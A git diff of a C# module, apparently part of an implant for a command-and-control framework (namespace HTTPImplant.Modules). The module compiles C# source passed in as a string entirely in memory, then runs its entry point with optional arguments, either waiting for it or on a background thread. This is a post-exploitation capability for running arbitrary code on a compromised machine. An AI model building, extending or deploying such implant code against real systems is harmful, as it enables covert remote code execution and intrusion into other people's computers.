@@ -3,86 +3,85 @@ using System.CodeDom.Compiler;
 using Microsoft.CSharp;
 using System.Reflection;
 using System.Threading;
-using System.Threading.Tasks;
+using System.Text;
 
 namespace HTTPImplant.Modules
 {
     public static class CompileAndRunNET
     {
-        public static void ExecuteCS(string code, string Class, string method)
+        public static void ExecuteCS(string sharpcode, string arguments, bool wait)
         {
-            Console.WriteLine("Compiling CS...");
-
-            CompilerParameters parameters = new CompilerParameters
-            {
-                GenerateInMemory = true,
-                GenerateExecutable = false
-            };
-
-            CancellationTokenSource cts = new CancellationTokenSource();
-            CancellationToken token = cts.Token;
-
-            Task<CompilerResults> compilationTask = null;
             try
             {
-                compilationTask = Task.Run(() =>
+                Console.WriteLine("Starting compilation of source code.");
+                Console.WriteLine("Compiled Source Code: \n" + sharpcode);
+
+                CSharpCodeProvider provider = new CSharpCodeProvider();
+                CompilerParameters parameters = new CompilerParameters
                 {
-                    using (CSharpCodeProvider provider = new CSharpCodeProvider())
-                    {
-                        return provider.CompileAssemblyFromSource(parameters, code);
-                    }
-                }, token);
+                    ReferencedAssemblies = { "System.dll", "System.Windows.Forms.dll", "System.Windows.dll" },
+                    GenerateInMemory = true,
+                    GenerateExecutable = true,
+                    IncludeDebugInformation = false
+                };
 
-                Console.WriteLine("1");
-
-                if (!compilationTask.Wait(TimeSpan.FromSeconds(30))) // Increase if needed
-                {
-                    Console.WriteLine("Compilation timed out.");
-                    cts.Cancel();
-                    return;
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Exception during compilation: " + ex.Message);
-                return;
-            }
-
-            Console.WriteLine("2");
-
-            try
-            {
-                CompilerResults results = compilationTask.Result;
-
+                CompilerResults results = provider.CompileAssemblyFromSource(parameters, sharpcode);
                 if (results.Errors.HasErrors)
                 {
-                    Console.WriteLine("Compilation failed:");
+                    StringBuilder sb = new StringBuilder();
+
                     foreach (CompilerError error in results.Errors)
                     {
-                        Console.WriteLine(error.ErrorText);
+                        sb.AppendLine($"Error ({error.ErrorNumber}): {error.ErrorText}");
+                    }
+
+                    Console.WriteLine("Compilation failed with errors:");
+                    Console.WriteLine(sb.ToString());
+                    throw new InvalidOperationException(sb.ToString());
+                }
+
+                Console.WriteLine("Compilation successful. Executing code...");
+
+                Assembly a = results.CompiledAssembly;
+                MethodInfo method = a.EntryPoint;
+                object o = a.CreateInstance(method.Name);
+
+                if (wait)
+                {
+                    Console.WriteLine("Waiting for the assembly to finish...");
+                    if (string.IsNullOrEmpty(arguments))
+                    {
+                        method.Invoke(o, null);
+                    }
+                    else
+                    {
+                        object[] ao = { arguments };
+                        method.Invoke(o, ao);
                     }
                 }
                 else
                 {
-                    Console.WriteLine("Compilation successful");
-
-                    Assembly assembly = results.CompiledAssembly;
-                    Type program = assembly.GetType(Class);
-                    MethodInfo main = program.GetMethod(method);
-
-                    if (program == null || main == null)
+                    Console.WriteLine("Not waiting for the assembly to finish. Starting in a new thread...");
+                    ThreadStart ths;
+                    if (string.IsNullOrEmpty(arguments))
                     {
-                        Console.WriteLine("Class or method not found in the compiled assembly.");
-                        return;
+                        ths = new ThreadStart(() => method.Invoke(o, null));
+                    }
+                    else
+                    {
+                        object[] ao = { arguments };
+                        ths = new ThreadStart(() => method.Invoke(o, ao));
                     }
 
-                    Console.WriteLine("Executing: " + Class + "." + method);
-                    main.Invoke(null, null); // Assuming the Main method doesn't need any arguments
+                    Thread th = new Thread(ths);
+                    th.Start();
                 }
+
+                Console.WriteLine("Execution process completed.");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Execution exception: " + ex.Message);
+                Console.WriteLine("An error occurred: " + ex.Message);
             }
         }
     }
